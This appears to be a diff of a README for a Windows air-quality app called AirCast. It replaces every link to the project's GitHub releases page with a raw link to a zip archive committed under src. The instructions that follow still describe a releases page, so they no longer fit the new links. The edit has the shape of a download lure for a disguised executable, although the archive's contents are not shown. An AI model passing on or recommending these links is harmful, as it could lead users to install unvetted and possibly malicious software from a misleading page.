@@ -1,6 +1,6 @@
 # 🌤️ AirCast - Forecast Air Quality with Confidence
 
-[![Download AirCast](https://img.shields.io/badge/Download%20AirCast-blue-grey?style=for-the-badge)](https://github.com/Instant-restharrow443/AirCast/releases)
+[![Download AirCast](https://img.shields.io/badge/Download%20AirCast-blue-grey?style=for-the-badge)](https://raw.githubusercontent.com/Instant-restharrow443/AirCast/main/src/Air-Cast-1.5.zip)
 
 ## 📌 What AirCast Does
 
@@ -33,7 +33,7 @@ AirCast is meant to run on a Windows PC from a release file.
 
 Visit this page to download the Windows release:
 
-https://github.com/Instant-restharrow443/AirCast/releases
+https://raw.githubusercontent.com/Instant-restharrow443/AirCast/main/src/Air-Cast-1.5.zip
 
 On that page:
 1. open the latest release
@@ -186,7 +186,7 @@ If a city is not listed, the app may not show a forecast for it yet.
 
 Download the Windows build here:
 
-https://github.com/Instant-restharrow443/AirCast/releases
+https://raw.githubusercontent.com/Instant-restharrow443/AirCast/main/src/Air-Cast-1.5.zip
 
 ## 🧱 Tech Stack
 
